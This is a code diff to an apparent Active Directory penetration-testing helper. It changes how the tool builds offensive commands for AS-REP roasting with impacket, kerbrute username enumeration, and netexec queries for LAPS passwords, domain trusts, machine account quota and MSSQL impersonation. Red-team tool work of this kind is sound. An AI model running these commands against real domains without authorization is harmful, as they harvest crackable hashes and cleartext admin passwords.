@@ -341,7 +341,7 @@ def build_catalog():
            "Any user with 'Do not require Kerberos preauth' yields a crackable hash with zero creds.",
            lambda st: st.have_username,
            lambda st: (f"{impacket('GetNPUsers') or 'impacket-GetNPUsers'} "
-                       f"{st.domain or '<domain>'}/ -no-pass -usersfile {userlist(st)} "
+                       f"{getnpusers_target(st)} -no-pass "
                        f"{dcflag(st)} -format hashcat -outputfile asrep.hashes"),
            tool=impacket("GetNPUsers"),
            success=re.compile(r"\$krb5asrep\$", re.I)))
@@ -350,8 +350,7 @@ def build_catalog():
            "No creds > Kerberos > username validation",
            "Validates which guessed/harvested usernames exist, via Kerberos pre-auth, without failed logons.",
            lambda st: st.have_username,
-           lambda st: (f"kerbrute userenum -d {st.domain or '<domain>'} "
-                       f"--dc {st.dc_ip} {userlist(st)}"),
+           lambda st: kerbrute_cmd(st),
            tool="kerbrute"))
 
     A(Tech("pre2k", P_FOOTHOLD, "pre-Windows-2000 computer accounts", ENUM, 3,
@@ -418,7 +417,7 @@ def build_catalog():
            "No password needed; crack offline with hashcat -m 18200.",
            lambda st: st.have_username and not st.have_creds,
            lambda st: (f"{impacket('GetNPUsers') or 'impacket-GetNPUsers'} "
-                       f"{st.domain or '<domain>'}/ -no-pass -usersfile {userlist(st)} "
+                       f"{getnpusers_target(st)} -no-pass "
                        f"{dcflag(st)} -format hashcat"),
            tool=impacket("GetNPUsers"),
            success=re.compile(r"\$krb5asrep\$", re.I)))
@@ -481,7 +480,7 @@ def build_catalog():
            "Creds > LDAP > object property mining",
            "Finds unconstrained/constrained delegation, passwords-in-description, AS-REP/SPN flags.",
            lambda st: st.have_creds,
-           lambda st: (f"{nxc} ldap {st.target} {st.nxc_auth()} "
+           lambda st: (f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} "
                        f"--trusted-for-delegation --password-not-required "
                        f"--admin-count --users"),
            tool=nxc_bin()))
@@ -491,7 +490,7 @@ def build_catalog():
            "Any principal with the LAPS read right gets a machine's local Administrator password in "
            "cleartext - instant local admin, and often the same reader covers many hosts.",
            lambda st: st.have_creds,
-           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} --laps   # legacy ms-Mcs-AdmPwd + Windows LAPS",
+           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M laps   # legacy ms-Mcs-AdmPwd + Windows LAPS",
            tool=nxc_bin(),
            success=re.compile(r"AdmPwd|Password|Administrator", re.I)))
 
@@ -530,7 +529,9 @@ def build_catalog():
            "Trusts open escalation to other domains - map them early; a child->parent edge is a "
            "reliable route to Enterprise Admin.",
            lambda st: st.have_creds,
-           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M enum_trusts",
+           lambda st: (f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} "
+                       f"--query \"(objectClass=trustedDomain)\" "
+                       f"\"flatName trustPartner trustDirection trustType trustAttributes\""),
            tool=nxc_bin(),
            success=re.compile(r"trust|Parent|Child|Forest", re.I)))
 
@@ -594,7 +595,7 @@ def build_catalog():
            "Creds > LDAP > ms-DS-MachineAccountQuota",
            "If MAQ > 0 any user can add a computer account - the pivot both RBCD and noPac rely on.",
            lambda st: st.have_creds,
-           lambda st: f"{nxc} ldap {st.target} {st.nxc_auth()} -M maq",
+           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} -M maq",
            tool=nxc_bin(),
            success=re.compile(r"MachineAccountQuota", re.I)))
 
@@ -676,7 +677,7 @@ def build_catalog():
            "Domain creds frequently log into MSSQL; check for sysadmin, EXECUTE AS impersonation, "
            "and linked servers you can hop with EXECUTE AT - all classic AD pivots.",
            lambda st: st.have_creds,
-           lambda st: f"{nxc} mssql {st.target} {st.nxc_auth()} -M mssql_priv",
+           lambda st: f"{nxc} mssql {st.target} {st.nxc_auth()} -M enum_impersonate",
            tool=nxc_bin(),
            success=re.compile(r"\[\+\]|sysadmin|Pwn3d|Linked", re.I)))
 
@@ -777,12 +778,40 @@ def domain_dn(st):
 
 
 def userlist(st):
-    """A path to a username list for spray/roast commands."""
+    """A username argument for tools that accept EITHER a file or a bare name
+    (e.g. netexec's `-u`). Not for tools whose argument must be a file - use
+    getnpusers_target() / kerbrute_cmd() for those."""
     if st.users_file:
         return shlex.quote(st.users_file)
     if st.user:
         return shlex.quote(st.user)      # a single user is still valid input
     return "users.txt"
+
+
+def getnpusers_target(st):
+    """Target expression for impacket-GetNPUsers. `-usersfile` must be a real
+    file, so a single held username is passed inline as `domain/user` instead
+    (both forms are documented impacket usage)."""
+    dom = st.domain or "<domain>"
+    if st.users_file:
+        return f"{dom}/ -usersfile {shlex.quote(st.users_file)}"
+    if st.user:
+        return f"{dom}/{shlex.quote(st.user)}"
+    return f"{dom}/ -usersfile users.txt"
+
+
+def kerbrute_cmd(st):
+    """kerbrute userenum's positional argument is a username *wordlist file*,
+    not a bare name. For a single held username, stage a one-line file first
+    (kept to a single shell line so --run's no-newline guard still runs it)."""
+    dom = st.domain or "<domain>"
+    if st.users_file:
+        return f"kerbrute userenum -d {dom} --dc {st.dc_ip} {shlex.quote(st.users_file)}"
+    if st.user:
+        f = "/tmp/admap_users.txt"
+        return (f"printf '%s\\n' {shlex.quote(st.user)} > {f} && "
+                f"kerbrute userenum -d {dom} --dc {st.dc_ip} {f}")
+    return f"kerbrute userenum -d {dom} --dc {st.dc_ip} users.txt"
 
 
 def bloodhound_cmd(st):
